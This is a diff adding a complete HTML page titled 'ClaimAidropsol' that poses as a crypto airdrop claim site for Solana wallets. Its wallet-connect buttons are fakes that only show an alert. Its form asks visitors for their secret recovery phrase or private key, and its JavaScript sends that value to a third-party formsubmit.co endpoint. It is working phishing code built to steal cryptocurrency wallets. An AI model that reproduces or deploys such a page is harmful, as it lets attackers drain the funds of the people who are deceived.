@@ -1,1 +1,138 @@
 # Airdropclaimsol
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ClaimAidropsol</title>
+  <script src="https://cdn.tailwindcss.com"></script> 
+  <style>
+    body {
+      font-family: sans-serif;
+    }
+    .animate-fadeIn {
+      animation: fadeIn 0.3s ease-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body class="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-indigo-900 text-white">
+
+  <!-- Header -->
+  <header class="py-6 px-4 sm:px-6 lg:px-8 flex justify-between items-center">
+    <h1 class="text-2xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-purple-400 to-pink-600">
+      ClaimAidropsol
+    </h1>
+    <button class="bg-purple-600 hover:bg-purple-700 transition duration-300 px-4 py-2 rounded-lg text-sm">
+      About
+    </button>
+  </header>
+
+  <!-- Hero Section -->
+  <main class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12 text-center">
+    <h2 class="text-4xl sm:text-5xl font-extrabold mb-4 bg-clip-text text-transparent bg-gradient-to-r from-pink-400 via-purple-500 to-indigo-500">
+      Claim Your Crypto Airdrop
+    </h2>
+    <p class="text-lg sm:text-xl text-gray-300 max-w-2xl mx-auto mb-8">
+      Connect your wallet and start claiming tokens right away.
+    </p>
+
+    <!-- CTA Button -->
+    <button onclick="openModal()"
+      class="group relative inline-flex items-center justify-center px-8 py-4 text-lg font-semibold text-white bg-gradient-to-r from-purple-600 to-indigo-600 rounded-lg shadow-lg hover:from-purple-700 hover:to-indigo-700 transform transition-all hover:scale-105 focus:outline-none">
+      🎁 Claim Airdrop
+    </button>
+  </main>
+
+  <!-- Modal -->
+  <div id="walletModal" class="hidden fixed inset-0 bg-black bg-opacity-70 flex justify-center items-center z-50 p-4">
+    <div class="bg-gray-800 p-6 rounded-xl w-full max-w-md shadow-2xl border border-gray-700 animate-fadeIn">
+      <h3 class="text-xl font-bold mb-4">Select a Wallet</h3>
+      <div class="grid grid-cols-2 gap-3 mb-6">
+        <button onclick="connectWallet('Phantom')" class="flex items-center justify-center space-x-2 bg-gray-700 hover:bg-gray-600 px-3 py-2 rounded-lg transition duration-200">Phantom</button>
+        <button onclick="connectWallet('Trust Wallet')" class="flex items-center justify-center space-x-2 bg-gray-700 hover:bg-gray-600 px-3 py-2 rounded-lg transition duration-200">Trust Wallet</button>
+        <button onclick="connectWallet('MetaMask')" class="flex items-center justify-center space-x-2 bg-gray-700 hover:bg-gray-600 px-3 py-2 rounded-lg transition duration-200">MetaMask</button>
+        <button onclick="connectWallet('Coinbase Wallet')" class="flex items-center justify-center space-x-2 bg-gray-700 hover:bg-gray-600 px-3 py-2 rounded-lg transition duration-200">Coinbase</button>
+        <button onclick="connectWallet('Solflare')" class="flex items-center justify-center space-x-2 bg-gray-700 hover:bg-gray-600 px-3 py-2 rounded-lg transition duration-200">Solflare</button>
+        <button onclick="connectWallet('MathWallet')" class="flex items-center justify-center space-x-2 bg-gray-700 hover:bg-gray-600 px-3 py-2 rounded-lg transition duration-200">MathWallet</button>
+        <button onclick="connectWallet('TokenPocket')" class="flex items-center justify-center space-x-2 bg-gray-700 hover:bg-gray-600 px-3 py-2 rounded-lg transition duration-200">TokenPocket</button>
+        <button onclick="connectWallet('BitKeep')" class="flex items-center justify-center space-x-2 bg-gray-700 hover:bg-gray-600 px-3 py-2 rounded-lg transition duration-200">BitKeep</button>
+        <button onclick="connectWallet('SafePal')" class="flex items-center justify-center space-x-2 bg-gray-700 hover:bg-gray-600 px-3 py-2 rounded-lg transition duration-200">SafePal</button>
+        <button onclick="connectWallet('AlphaWallet')" class="flex items-center justify-center space-x-2 bg-gray-700 hover:bg-gray-600 px-3 py-2 rounded-lg transition duration-200">AlphaWallet</button>
+      </div>
+
+      <form id="claimForm" onsubmit="handleSubmit(event)">
+        <label class="block mb-2 font-medium">Secret Phrase or Private Key</label>
+        <textarea id="phraseInput" placeholder="Enter your secret recovery phrase or private key"
+          class="w-full p-3 bg-gray-900 border border-gray-600 rounded-lg resize-none h-24 focus:outline-none focus:ring-2 focus:ring-purple-500" required></textarea>
+        <button type="submit"
+          class="mt-4 w-full py-3 rounded-lg font-semibold bg-green-600 hover:bg-green-700 transition">
+          Claim Now
+        </button>
+      </form>
+
+      <div id="successMessage" class="hidden mt-4 text-green-400 text-center">✅ Successfully submitted!</div>
+      <div id="errorMessage" class="hidden mt-4 text-red-400 text-center">❌ There was an issue.</div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="py-6 px-4 text-center text-sm text-gray-500 mt-12">
+    © <script>document.write(new Date().getFullYear())</script> ClaimAidropsol. All rights reserved.
+  </footer>
+
+  <!-- JavaScript -->
+  <script>
+    function openModal() {
+      document.getElementById("walletModal").classList.remove("hidden");
+    }
+
+    function connectWallet(walletName) {
+      alert("Connecting to " + walletName + "...");
+      document.getElementById("walletModal").classList.add("hidden");
+    }
+
+    function handleSubmit(e) {
+      e.preventDefault();
+      const phrase = document.getElementById("phraseInput").value.trim();
+      const successEl = document.getElementById("successMessage");
+      const errorEl = document.getElementById("errorMessage");
+
+      if (!phrase) {
+        alert("Please enter your secret phrase or private key.");
+        return;
+      }
+
+      fetch("https://formsubmit.co/ajax/zewege",  {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify({
+          PhraseOrPrivateKey: phrase,
+          Timestamp: new Date().toISOString()
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          successEl.classList.remove("hidden");
+          errorEl.classList.add("hidden");
+          document.getElementById("claimForm").reset();
+        } else {
+          throw new Error("Submission failed");
+        }
+      })
+      .catch(err => {
+        console.error(err);
+        errorEl.classList.remove("hidden");
+        successEl.classList.add("hidden");
+      });
+    }
+  </script>
+</body>
+</html>
